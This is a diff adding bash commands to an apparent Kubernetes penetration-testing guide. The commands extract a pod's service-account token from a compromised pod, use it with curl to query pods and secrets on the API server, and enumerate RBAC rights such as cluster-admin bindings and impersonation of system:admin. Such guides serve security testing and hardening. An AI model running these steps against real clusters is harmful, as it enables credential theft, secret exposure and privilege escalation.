@@ -30,9 +30,30 @@ Every pod by default gets a service account token mounted at `/var/run/secrets/k
 
 **Extract the token from inside a compromised pod:**
 
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+# namespace, token, ca.crt
+```
+
 **Validate the token against the API server:**
 
+```bash
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
+curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
+  -H "Authorization: Bearer $TOKEN" \
+  $APISERVER/api/v1/namespaces/$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)/pods
+```
+
 **Check token permissions:**
+
+```bash
+kubectl auth can-i --list   # full effective-permission dump
+kubectl auth can-i get secrets --all-namespaces
+kubectl auth can-i create pods
+kubectl auth can-i create clusterrolebindings
+```
 
 **Look for kubeconfig in common paths:**
 - `~/.kube/config`
@@ -51,9 +72,27 @@ The API server is the central control plane. Enumerate endpoints to understand c
 
 **Version and health:**
 
+```bash
+kubectl version --short 2>/dev/null
+curl -sk https://<APISERVER>:6443/version
+curl -sk https://<APISERVER>:6443/healthz
+```
+
 **Core API resources:**
 
+```bash
+kubectl api-resources -o wide
+kubectl get pods,secrets,services --all-namespaces
+curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets | head -c 500
+```
+
 **Extension APIs (apps, networking, RBAC):**
+
+```bash
+kubectl get deployments,daemonsets,statefulsets --all-namespaces
+kubectl get clusterroles cluster-admin -o yaml
+kubectl get clusterrolebindings -o wide
+```
 
 **Key indicators:**
 - `200` on `/api/v1/secrets` → full secret read access
@@ -68,6 +107,13 @@ The API server is the central control plane. Enumerate endpoints to understand c
 RBAC (Role-Based Access Control) is the primary authorization layer. Misconfigurations create privilege escalation paths.
 
 **Enumerate effective permissions:**
+
+```bash
+kubectl auth can-i --list
+kubectl auth can-i '*' '*'
+kubectl auth can-i create clusterrolebindings -n default
+kubectl auth can-i impersonate users/system:admin
+```
 
 **Common overprivileged patterns:**
 | Pattern | Risk | Example |
